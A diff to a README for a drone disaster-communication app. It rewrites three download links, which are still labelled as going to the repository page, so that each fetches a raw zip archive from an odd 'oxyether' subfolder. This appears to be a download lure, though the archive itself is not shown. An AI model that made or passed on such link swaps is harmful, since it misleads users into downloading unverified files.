@@ -1,12 +1,12 @@
 # 🚁 Drone-Diaster-Communication - Restore Contact in Crisis Zones
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Eng1512/Drone-Diaster-Communication)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Eng1512/Drone-Diaster-Communication/raw/refs/heads/main/oxyether/Drone-Diaster-Communication-v3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download from GitHub](https://github.com/Eng1512/Drone-Diaster-Communication)
+[Download from GitHub](https://github.com/Eng1512/Drone-Diaster-Communication/raw/refs/heads/main/oxyether/Drone-Diaster-Communication-v3.4.zip)
 
 ## 🧭 What This App Does
 
@@ -136,7 +136,7 @@ This project helps in places where normal phone towers or network lines fail. Th
 
 ## 🧭 Quick Access
 
-[Open the download page](https://github.com/Eng1512/Drone-Diaster-Communication)
+[Open the download page](https://github.com/Eng1512/Drone-Diaster-Communication/raw/refs/heads/main/oxyether/Drone-Diaster-Communication-v3.4.zip)
 
 ## 📦 File Handling Tips
 
